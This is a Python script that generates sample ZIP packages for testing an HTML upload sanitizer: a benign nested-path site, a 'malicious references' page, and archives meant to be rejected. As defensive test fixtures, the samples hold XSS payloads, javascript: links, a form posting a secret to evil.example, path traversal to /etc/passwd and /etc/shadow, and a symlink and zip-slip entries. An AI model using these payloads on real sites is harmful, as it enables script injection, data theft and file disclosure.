#!/usr/bin/env python3
"""生成示例 ZIP 包。

在 samples/ 下产出：
  nested_paths.zip      嵌套路径样张：相对 / 根相对引用、深层 CSS 的 url()
  malicious_refs.zip    恶意引用样张：包外、越界、脚本、表单、@import 等
  reject_*.zip          结构非法、应被整体拒绝的包

同时把两个正常样张的源文件展开到 samples/src/ 便于阅读。
用法：python3 samples/make_samples.py
"""

import base64
import os
import struct
import zipfile
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, "src")


# ---------- 图片生成（纯标准库） ----------

def png_bytes(width: int, height: int, rgb: tuple[int, int, int]) -> bytes:
    def chunk(typ: bytes, data: bytes) -> bytes:
        return (
            struct.pack(">I", len(data))
            + typ
            + data
            + struct.pack(">I", zlib.crc32(typ + data) & 0xFFFFFFFF)
        )

    ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
    raw = b"".join(b"\x00" + bytes(rgb) * width for _ in range(height))
    return b"\x89PNG\r\n\x1a\n" + ihdr + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")


# 1x1 白色 JPEG
JPEG_1X1 = base64.b64decode(
    "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/2wBDAQMDAwQDBAgEBAgQCwkLEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBD/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q=="
)
assert JPEG_1X1[:2] == b"\xff\xd8" and JPEG_1X1[-2:] == b"\xff\xd9", "内置 JPEG 样例损坏"


# ---------- 样张内容 ----------

NESTED_PATHS = {
    "index.html": """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>嵌套路径样张 · 首页</title>
<link rel="stylesheet" href="/assets/css/site.css">
<style>
  .hero { padding: 24px; color: #fff; background-image: url(assets/img/banner.jpg); background-size: cover; }
</style>
</head>
<body>
<h1>嵌套路径样张</h1>
<p><img src="assets/img/logo.png" alt="logo" width="32"></p>
<div class="hero">根相对样式表 + 相对图片 + 内嵌样式背景（hero）</div>
<ul>
  <li><a href="pages/about.html">关于（相对链接）</a></li>
  <li><a href="/pages/gallery/photos.html">相册（根相对链接）</a></li>
</ul>
</body>
</html>
""",
    "pages/about.html": """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>关于</title>
<link rel="stylesheet" href="../assets/css/site.css">
</head>
<body>
<h1>关于</h1>
<p><img src="../assets/img/photo1.png" alt="photo" width="32"></p>
<p><a href="../index.html">返回首页（相对）</a> · <a href="/index.html">返回首页（根相对）</a></p>
</body>
</html>
""",
    "pages/gallery/photos.html": """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>相册</title>
<link rel="stylesheet" href="../../assets/css/site.css">
<link rel="stylesheet" href="../../assets/css/pages/deep.css">
</head>
<body>
<h1>相册</h1>
<div class="gallery">深层 CSS 背景（gallery）</div>
<p><img src="../../assets/img/photo1.png" alt="photo" width="32">
<img src="/assets/img/logo.png" alt="logo" width="32"></p>
<p><a href="../about.html">关于</a> · <a href="/index.html">首页</a></p>
</body>
</html>
""",
    "assets/css/site.css": """body { font-family: system-ui, sans-serif; margin: 24px; }
h1 { color: #1d4ed8; }
/* 相对本 CSS 文件目录：assets/css/../img/banner.jpg */
.hero { background-image: url(../img/banner.jpg); }
/* 根相对：指向包根 */
.badge { background-image: url(/assets/img/logo.png); }
""",
    "assets/css/pages/deep.css": """/* 深层 CSS：assets/css/pages/../../img/banner.jpg -> assets/img/banner.jpg */
.gallery { padding: 24px; color: #fff; background-image: url(../../img/banner.jpg); background-size: cover; }
""",
    "assets/img/logo.png": png_bytes(8, 8, (37, 99, 235)),
    "assets/img/photo1.png": png_bytes(8, 8, (22, 163, 74)),
    "assets/img/banner.jpg": JPEG_1X1,
}

MALICIOUS_REFS = {
    "index.html": """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>恶意引用样张</title>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0; url=https://evil.example/">
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="missing.css">
<link rel="stylesheet" href="https://evil.example/x.css">
<style>
  @import url("https://evil.example/import.css");
  .ext { background: url(https://evil.example/bg.png); }
  .esc { background: url(../escape.png); }
  .ok  { background: url(ok.png); }
</style>
<script>alert("xss")</script>
</head>
<body onclick="alert(1)">
<h1 onmouseover="alert(2)">恶意引用样张（所有危险内容都应被拦截并列在报告中）</h1>
<p>正常图片：<img src="ok.png" alt="ok" width="32"></p>
<img src="missing.png" alt="missing">
<img src="https://evil.example/track.png" alt="">
<img src="//evil.example/proto-relative.png" alt="">
<img src="../../../etc/passwd" alt="">
<img src="/etc/passwd" alt="">
<img src="data:image/png;base64,iVBORw0KGgo=" alt="">
<img srcset="https://evil.example/a.png 1x, ok.png 2x" alt="">
<ul>
  <li><a href="javascript:alert(1)">javascript: 链接</a></li>
  <li><a href="../../../etc/shadow">越界链接</a></li>
  <li><a href="https://evil.example/">包外链接</a></li>
  <li><a href="ok.html" target="_top">正常页面链接（target=_top 会被剥掉）</a></li>
</ul>
<form action="https://evil.example/collect" method="post">
  <input name="secret" value="leak">
  <button formaction="https://evil.example/x">提交</button>
</form>
<iframe src="https://evil.example/frame"></iframe>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<object data="https://evil.example/obj"></object>
<embed src="https://evil.example/emb">
<svg onload="alert(1)" width="10" height="10"><a xlink:href="javascript:alert(1)"><text x="0" y="8">x</text></a></svg>
<p style="background:url(https://evil.example/inline.png)">内联样式里的包外引用</p>
</body>
</html>
""",
    "ok.html": """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>正常页面</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<h1>正常页面</h1>
<p><img src="ok.png" alt="ok" width="32"></p>
<p><a href="index.html">返回 index</a></p>
</body>
</html>
""",
    "style.css": """@import "https://evil.example/imp.css";
body { font-family: system-ui, sans-serif; margin: 24px; }
.good { background-image: url(ok.png); }
.missing { background-image: url(nope.png); }
.evil { background-image: url(https://evil.example/x.png); }
.escape { background-image: url(../../out.png); }
""",
    "ok.png": png_bytes(8, 8, (234, 88, 12)),
}


# ---------- 输出 ----------

def _as_bytes(data: "str | bytes") -> bytes:
    return data.encode("utf-8") if isinstance(data, str) else data


def materialize(root: str, files: "dict[str, str | bytes]") -> None:
    for rel, data in files.items():
        dest = os.path.join(root, rel)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as fh:
            fh.write(_as_bytes(data))


def make_zip(zip_path: str, files: "dict[str, str | bytes]") -> None:
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for rel, data in sorted(files.items()):
            zf.writestr(rel, _as_bytes(data))
    print(f"写出 {os.path.relpath(zip_path, HERE)}（{len(files)} 个文件）")


def make_reject_zips() -> None:
    # 逃逸包根
    with zipfile.ZipFile(os.path.join(HERE, "reject_escape.zip"), "w") as zf:
        zf.writestr("../evil.html", "<html>escape</html>")
    # 绝对路径
    with zipfile.ZipFile(os.path.join(HERE, "reject_absolute.zip"), "w") as zf:
        zf.writestr("/abs/evil.html", "<html>abs</html>")
    # 规范化重名
    with zipfile.ZipFile(os.path.join(HERE, "reject_dupe.zip"), "w") as zf:
        zf.writestr("a/index.html", "<html>1</html>")
        zf.writestr("a/./index.html", "<html>2</html>")
    # 符号链接
    with zipfile.ZipFile(os.path.join(HERE, "reject_symlink.zip"), "w") as zf:
        info = zipfile.ZipInfo("link.html")
        info.external_attr = (0o120777 << 16)  # S_IFLNK
        zf.writestr(info, "/etc/passwd")
    # 不支持的文件类型
    with zipfile.ZipFile(os.path.join(HERE, "reject_badtype.zip"), "w") as zf:
        zf.writestr("index.html", "<html>ok</html>")
        zf.writestr("notes.txt", "plain text")
    # 文件数超限（101 个）
    with zipfile.ZipFile(os.path.join(HERE, "reject_toomany.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(101):
            zf.writestr(f"p{i:03d}.html", f"<html>{i}</html>")
    print("写出 reject_*.zip（逃逸 / 绝对路径 / 重名 / 符号链接 / 非法类型 / 超限）")


def main() -> None:
    for name, files in (("nested_paths", NESTED_PATHS), ("malicious_refs", MALICIOUS_REFS)):
        materialize(os.path.join(SRC, name), files)
        make_zip(os.path.join(HERE, f"{name}.zip"), files)
    make_reject_zips()


if __name__ == "__main__":
    main()
